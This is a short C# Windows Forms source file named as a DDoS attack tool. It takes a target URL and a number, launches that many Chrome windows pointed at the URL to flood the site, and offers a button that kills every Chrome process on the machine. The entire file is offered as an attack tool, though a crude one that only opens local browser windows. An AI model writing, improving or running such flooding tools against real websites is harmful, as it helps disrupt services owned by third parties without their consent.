using System.Diagnostics;

namespace DDoSAttack
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }


        private void btnStartDDoSAttack_Click(object sender, EventArgs e)
        {
            bool isValidURL = Uri.TryCreate(tbTargetURL.Text, UriKind.Absolute, out Uri uriResult) && (uriResult.Scheme == Uri.UriSchemeHttp || uriResult.Scheme == Uri.UriSchemeHttps);
            if (!(int.TryParse(tbNumBrowsers.Text, out int number) && number > 0) || !isValidURL)
            {
                lbInvalid.Text = "Invalid input";
                lbInvalid.ForeColor = Color.Red;
            }
            else
            {
                lbInvalid.Text = "";
                int numBrowsers = int.Parse(tbNumBrowsers.Text);
                String targetURL = tbTargetURL.Text;


                for (int i = 0; i < numBrowsers; i++)
                {
                    Process.Start("C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe", targetURL);
                }
            }

        }

        private void btnCloseAll_Click(object sender, EventArgs e)
        {
            foreach (var process in Process.GetProcessesByName("chrome"))
            {
                process.Kill();
            }
        }

    }
}